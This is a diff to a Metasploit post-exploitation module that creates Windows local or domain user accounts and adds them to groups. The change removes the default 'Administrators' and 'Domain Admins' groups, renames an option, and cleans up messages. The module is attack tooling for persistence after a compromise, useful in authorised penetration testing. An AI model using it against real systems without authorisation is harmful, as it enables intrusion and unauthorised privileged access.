@@ -27,7 +27,7 @@ class MetasploitModule < Msf::Post
         OptString.new('USERNAME',  [true,  'The username of the user to add (not-qualified, e.g. BOB)']),
         OptString.new('PASSWORD',  [false, 'Password of the user']),
         OptString.new('GROUP',     [false, 'Group to add the user into.']),
-        OptBool.new('ADDGROUP', [true, ' Add group if it not exists', true]),
+        OptBool.new('ADDTOGROUP', [true, ' Add group if it not exists', false]),
         OptBool.new('ADDTODOMAIN', [true,  'Add to Domain if true, Add to Local if false', false]),
         OptString.new('TOKEN',     [false, 'Username or PID of the Token which will be used. If blank, Domain Admin Tokens will be enumerated.', '']),
       ]
@@ -210,41 +210,43 @@ class MetasploitModule < Msf::Post
   end
 
   def local_mode
-    if datastore['GROUP'].nil?
-      datastore['GROUP'] = 'Administrators'
-      print_status("You have not set up a group. The default is '#{datastore['GROUP']}' ")
-    end
     if datastore['PASSWORD'].nil?
       datastore['PASSWORD'] = Rex::Text.rand_text_alphanumeric(16) + Rex::Text.rand_text_numeric(2)
       print_status("You have not set up a PASSWORD. The default is '#{datastore['PASSWORD']}' ")
     end
     #  Add user
     if enum_user.include? datastore['USERNAME']
-      print_status("User '#{datastore['USERNAME']}' already exists.!")
+      print_status("User '#{datastore['USERNAME']}' already exists.")
     else
       result = add_user(datastore['USERNAME'], datastore['PASSWORD'])
       if result['return'] == 0
-        print_good("User '#{datastore['USERNAME']}' was added!")
+        print_good("User '#{datastore['USERNAME']}' was added.")
       else
         check_result(result)
       end
     end
 
-    #  Add localgroup if it not exists
-    if datastore['ADDGROUP'] && (!enum_localgroup.include? datastore['GROUP'])
-      result = add_localgroup(datastore['GROUP'])
-      if result['return'] == 0
-        print_good("Group '#{datastore['GROUP']}'  was added!")
+    #  Add localgroup
+    if datastore['ADDTOGROUP'] && (!enum_localgroup.include? datastore['GROUP'])
+      if datastore['GROUP']
+        result = add_localgroup(datastore['GROUP'])
+        if result['return'] == 0
+          print_good("Group '#{datastore['GROUP']}'  was added.")
+        else
+          check_result(result)
+        end
       else
-        check_result(result)
+        print_error("Check your group name")
       end
     end
     #  Add Member to LocalGroup
-    result = add_members_localgroup(datastore['GROUP'], datastore['USERNAME'])
-    if result['return'] == 0
-      print_good("'#{datastore['USERNAME']}' is now a member of the '#{datastore['GROUP']}' group!")
-    else
-      check_result(result)
+    if datastore['ADDTOGROUP'] && datastore['GROUP']
+      result = add_members_localgroup(datastore['GROUP'], datastore['USERNAME'])
+      if result['return'] == 0
+        print_good("'#{datastore['USERNAME']}' is now a member of the '#{datastore['GROUP']}' group.")
+      else
+        check_result(result)
+      end
     end
   end
 
@@ -256,11 +258,6 @@ class MetasploitModule < Msf::Post
     else
       print_error("No DC is available for the specified domain or the domain does not exist. ")
       return false
-    end
-    #  set up default group
-    if datastore['GROUP'].nil?
-      datastore['GROUP'] = 'Domain Admins'
-      print_status("You have not set up a group. The default is '#{datastore['GROUP']}' ")
     end
     if datastore['PASSWORD'].nil?
       datastore['PASSWORD'] = Rex::Text.rand_text_alphanumeric(16) + Rex::Text.rand_text_numeric(2)
@@ -291,32 +288,36 @@ class MetasploitModule < Msf::Post
       print_status("Adding '#{datastore['USERNAME']}' as a user to the #{domain} domain")
       result = add_user(datastore['USERNAME'], datastore['PASSWORD'], server_name)
       if result['return'] == 0
-        print_good("User '#{datastore['USERNAME']}' was added to the #{domain} domain!")
+        print_good("User '#{datastore['USERNAME']}' was added to the #{domain} domain.")
       else
         check_result(result)
       end
     end
 
-    ## Add user to a domain group,  Add group if it not exists
-    if datastore['ADDGROUP'] && (!enum_group(server_name).include? datastore['GROUP'])
-      result = add_group(datastore['GROUP'], server_name)
-      if result['return'] == 0
-        print_good("Group '#{datastore['GROUP']}'  was added!")
+    ## Add group to  domain
+    if datastore['ADDTOGROUP'] && (!enum_group(server_name).include? datastore['GROUP'])
+      if datastore['GROUP']
+        result = add_group(datastore['GROUP'], server_name)
+        if result['return'] == 0
+          print_good("Group '#{datastore['GROUP']}'  was added!")
+        else
+          check_result(result)
+        end
+        if (!enum_group(server_name).include? datastore['GROUP'])
+          print_error("The #{datastore['GROUP']} group not exist in the domain, It is possible that the same group name exists for the local group")
+        end
       else
-        check_result(result)
+        print_error("Check your group name")
       end
     end
-    if enum_group(server_name).include? datastore['GROUP']
+
+    if datastore['ADDTOGROUP'] && (enum_group(server_name).include? datastore['GROUP'])
       ## check if user is already a member of the group
       members = get_members_from_group(datastore['GROUP'], server_name)
-      already_member_group = false
       # Show results if we have any, Error if we don't
       if members.include? datastore['USERNAME']
         print_status("#{datastore['USERNAME']} is already a member of the '#{datastore['GROUP']}' group")
-        already_member_group = true
-      end
-
-      if already_member_group == false
+      else
         print_status("Adding '#{datastore['USERNAME']}' to the '#{datastore['GROUP']}' Domain Group")
         result = add_members_group(datastore['GROUP'], datastore['USERNAME'], server_name)
         if result['return'] == 0
@@ -325,8 +326,6 @@ class MetasploitModule < Msf::Post
           check_result(result)
         end
       end
-    else
-      print_error("The #{datastore['GROUP']} group not exist in the domain, It is possible that the same group name exists for the local group")
     end
   end
 
